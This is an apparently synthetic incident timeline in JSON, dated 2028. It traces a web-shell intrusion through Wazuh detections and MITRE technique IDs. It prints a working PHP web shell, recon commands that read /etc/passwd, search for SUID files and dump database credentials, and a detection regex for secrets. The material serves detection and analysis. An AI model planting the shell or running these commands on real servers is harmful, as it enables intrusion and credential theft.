    {"step": 1, "tactic": "Initial Access / Exploit Public-Facing Application — Upload Endpoint Abuse", "technique": "T1190", "what_happened": "At 2028-02-22 10:18:39 CET, Apache access log captured POST /admin/upload.php from client 185.220.101.79 (HTTP 200, 384-byte body). The /admin/upload.php endpoint has a known unrestricted-file-type vulnerability (corp ticket WEB-CVE-2028-001, patch deadline 2028-03-15 not yet met). The attacker uploaded a PHP file disguised as an allowed type.", "chain_reason": "Wazuh rule 31200 'POST to known-vulnerable upload endpoint from non-corp IP' fired with rule.mitre.id=T1190.", "first_seen": "2028-02-22T10:18:39+0100"},
    {"step": 2, "tactic": "Persistence / Server Software Component — Web Shell Drop", "technique": "T1505.003", "what_happened": "At 10:18:42 (3 seconds after upload), Wazuh FIM on linux-web-app-srv-05 (agent.id=055) reported syscheck.event='added' on syscheck.path='/var/www/html/.cache/.cmd.php', uname_after=www-data, mode 644. syscheck.diff shows the one-line PHP shell: '<?php if (isset($_POST[\"cmd\"])) { echo \"<pre>\"; system($_POST[\"cmd\"]); echo \"</pre>\"; } ?>'. Hidden dot-prefix + /.cache/ path + system() body = canonical web-shell pattern.", "chain_reason": "Wazuh FIM rule 553 + custom rule 31101 'Web shell indicator: system/exec in PHP body' fired with rule.mitre.id=T1505.003.", "first_seen": "2028-02-22T10:18:42+0100"},
    {"step": 3, "tactic": "Execution / Web Shell Invocation with Progressive Recon", "technique": "T1059.004", "what_happened": "From 10:24:11 to 10:38:22, 4 POSTs from 185.220.101.79 to /.cache/.cmd.php with progressive recon: cmd=id;uname -a (10:24:11), cmd=cat /etc/passwd (10:25:08), cmd=find / -perm -4000 -type f (SUID search, 10:31:14), cmd=cat /var/www/html/config/db.php (DB creds, 10:38:22). Each invocation generated an auditd EXECVE: /bin/sh -c <cmd> by uid=33 (www-data).", "chain_reason": "Wazuh rule 31103 'POST to web shell with system command parameters from external IP' + rule 31104 'auditd shell EXECVE from www-data' fired with rule.mitre.id=[T1505.003,T1059.004].", "first_seen": "2028-02-22T10:24:11+0100"},
    {"step": 4, "tactic": "Credential Access / Database Configuration Exfiltration", "technique": "T1552.001", "what_happened": "At 10:38:22, the cat /var/www/html/config/db.php invocation returned the corp app's MySQL connection: DB_HOST=10.108.50.88, DB_USER=corp_app_prod, DB_PASS=<8-char password>, DB_NAME=corp_billing. Apache response Content-Length=312 matches file size. The attacker now has the production billing-DB credentials.", "chain_reason": "Wazuh rule 31105 'Web shell response contains DB connection keywords' fired with rule.mitre.id=T1552.001 on Apache mod_security audit log payload regex 'DB_PASS|DATABASE_URL|MYSQL_PASSWORD'.", "first_seen": "2028-02-22T10:38:22+0100"}
